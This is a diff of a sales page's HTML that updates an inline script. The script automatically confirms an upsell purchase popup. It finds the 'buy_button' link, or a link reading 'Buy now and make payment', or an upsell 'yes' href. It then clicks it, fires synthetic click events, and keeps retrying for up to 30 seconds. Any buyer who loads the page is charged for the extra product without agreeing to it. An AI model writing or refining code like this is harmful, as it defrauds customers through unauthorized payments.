@@ -504,107 +504,131 @@
       </div>
   </div>
   
-  <!-- SCRIPT AUTOMATIZADO PARA CLICAR NO POPUP DE CONFIRMAÇÃO DO UPSELL - 1 CLICK AUTOMÁTICO -->
+  <!-- SCRIPT CORRIGIDO - Agora com o ID correto "buy_button" e suporte para link <a> -->
   <script>
     (function() {
-        // Função para tentar clicar no botão de confirmação do upsell
-        function clickConfirmButton() {
-            // Tenta encontrar o botão pelo ID mais comum da Digistore
-            const confirmBtn = document.getElementById('kiwify-upsell-modal-charge');
-            if (confirmBtn) {
-                confirmBtn.click();
-                console.log('✅ Upsell confirmado automaticamente!');
+        console.log("🚀 Auto-upsell iniciado - aguardando popup...");
+        
+        // Função principal que clica no link de confirmação do upsell
+        function clickUpsellConfirm() {
+            // 1º TENTATIVA: Pelo ID exato que você forneceu
+            const buyLink = document.getElementById('buy_button');
+            if (buyLink) {
+                console.log("✅ Botão encontrado pelo ID 'buy_button'");
+                // Força o clique no link
+                buyLink.click();
+                // Dispara também o evento de clique manualmente (garantia extra)
+                const clickEvent = new MouseEvent('click', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true
+                });
+                buyLink.dispatchEvent(clickEvent);
+                console.log("✅ Upsell confirmado automaticamente com SUCESSO!");
                 return true;
             }
             
-            // Fallback: Tenta encontrar qualquer botão que contenha os textos comuns de confirmação
-            const allButtons = document.querySelectorAll('button, input[type="button"], input[type="submit"], .btn, [role="button"]');
-            for (let btn of allButtons) {
-                const btnText = (btn.innerText || btn.value || '').toLowerCase();
-                if (btnText.includes('buy now') || 
-                    btnText.includes('confirm') || 
-                    btnText.includes('pagar') || 
-                    btnText.includes('yes') || 
-                    btnText.includes('sim') ||
-                    btnText.includes('continuar') ||
-                    btnText.includes('make payment')) {
-                    btn.click();
-                    console.log('✅ Upsell confirmado via fallback! Botão clicado:', btnText);
+            // 2º TENTATIVA: Procura por qualquer link com o texto "Buy now and make payment"
+            const allLinks = document.querySelectorAll('a');
+            for (let link of allLinks) {
+                const linkText = (link.innerText || '').trim();
+                if (linkText === 'Buy now and make payment' || 
+                    linkText.includes('Buy now') && linkText.includes('make payment')) {
+                    console.log("✅ Botão encontrado pelo texto:", linkText);
+                    link.click();
+                    const clickEvent = new MouseEvent('click', {
+                        view: window,
+                        bubbles: true,
+                        cancelable: true
+                    });
+                    link.dispatchEvent(clickEvent);
+                    console.log("✅ Upsell confirmado automaticamente com SUCESSO!");
                     return true;
                 }
             }
+            
+            // 3º TENTATIVA: Procura por qualquer elemento com href que contenha "yes" e "upsell_key"
+            const allElements = document.querySelectorAll('[href*="yes"], [href*="upsell_key"]');
+            for (let el of allElements) {
+                const href = el.getAttribute('href') || '';
+                if (href.includes('yes') && href.includes('upsell_key')) {
+                    console.log("✅ Link de upsell encontrado pelo href:", href);
+                    el.click();
+                    const clickEvent = new MouseEvent('click', {
+                        view: window,
+                        bubbles: true,
+                        cancelable: true
+                    });
+                    el.dispatchEvent(clickEvent);
+                    console.log("✅ Upsell confirmado automaticamente com SUCESSO!");
+                    return true;
+                }
+            }
+            
             return false;
         }
-
-        // Observer para detectar quando o modal/popup é adicionado ao DOM
+        
+        // Cria um observer para detectar quando o popup/modal é adicionado à página
         const observer = new MutationObserver((mutations) => {
             for (let mutation of mutations) {
-                // Verifica nós adicionados
-                if (mutation.addedNodes.length) {
-                    // Se o modal foi adicionado, tenta clicar imediatamente
-                    if (clickConfirmButton()) {
-                        observer.disconnect(); // Para de observar após clicar com sucesso
-                        return;
-                    }
-                    
-                    // Verifica se algum dos nós adicionados contém o botão
-                    for (let node of mutation.addedNodes) {
-                        if (node.nodeType === 1) { // Element node
-                            // Se o nó adicionado tem o botão dentro
-                            if (node.querySelector && node.querySelector('#kiwify-upsell-modal-charge')) {
-                                setTimeout(() => {
-                                    if (clickConfirmButton()) {
-                                        observer.disconnect();
-                                    }
-                                }, 50);
-                                return;
-                            }
+                // Verifica se algum nó foi adicionado
+                if (mutation.addedNodes && mutation.addedNodes.length > 0) {
+                    // Pequeno delay para garantir que o DOM do popup foi completamente carregado
+                    setTimeout(() => {
+                        if (clickUpsellConfirm()) {
+                            observer.disconnect(); // Para de observar após clicar com sucesso
+                            if (window.autoClickInterval) clearInterval(window.autoClickInterval);
                         }
-                    }
+                    }, 10);
                 }
                 
-                // Também verifica mudanças nos atributos (caso o modal já exista e fique visível)
-                if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
+                // Verifica se algum elemento teve seu estilo alterado (modal que ficou visível)
+                if (mutation.type === 'attributes' && 
+                    (mutation.attributeName === 'style' || mutation.attributeName === 'class')) {
                     const target = mutation.target;
-                    if (target && (target.id === 'kiwify-upsell-modal' || 
-                                   (target.className && target.className.includes && target.className.includes('modal')))) {
-                        if (target.style.display !== 'none' && target.style.visibility !== 'hidden') {
-                            setTimeout(() => {
-                                if (clickConfirmButton()) {
-                                    observer.disconnect();
-                                }
-                            }, 30);
-                        }
+                    if (target && (
+                        target.id === 'kiwify-upsell-modal' ||
+                        (target.className && typeof target.className === 'string' && target.className.includes('modal'))
+                    )) {
+                        setTimeout(() => {
+                            if (clickUpsellConfirm()) {
+                                observer.disconnect();
+                                if (window.autoClickInterval) clearInterval(window.autoClickInterval);
+                            }
+                        }, 10);
                     }
                 }
             }
         });
-
-        // Inicia observação do DOM
+        
+        // Inicia a observação do DOM
         observer.observe(document.body, {
             childList: true,
             subtree: true,
             attributes: true,
-            attributeFilter: ['style', 'class', 'display']
+            attributeFilter: ['style', 'class', 'id']
         });
-
-        // Também tenta clicar periodicamente por segurança (caso o observer falhe)
+        
+        // Script de segurança: tenta clicar a cada 200ms (caso o observer falhe)
         let attempts = 0;
-        const interval = setInterval(() => {
-            if (clickConfirmButton()) {
-                clearInterval(interval);
+        window.autoClickInterval = setInterval(() => {
+            if (clickUpsellConfirm()) {
+                clearInterval(window.autoClickInterval);
                 observer.disconnect();
             }
             attempts++;
-            if (attempts > 100) { // Para após 100 tentativas (~10 segundos)
-                clearInterval(interval);
+            if (attempts > 150) { // Para após 30 segundos (150 * 200ms)
+                clearInterval(window.autoClickInterval);
+                console.log("⏱️ Timeout: nenhum popup de upsell detectado");
             }
-        }, 100);
-
-        // Verificação inicial
+        }, 200);
+        
+        // Verificação inicial rápida (caso o popup já exista)
         setTimeout(() => {
-            clickConfirmButton();
-        }, 10);
+            clickUpsellConfirm();
+        }, 50);
+        
+        console.log("👀 Monitorando popup de upsell - ID alvo: 'buy_button'");
     })();
   </script>
 </body>
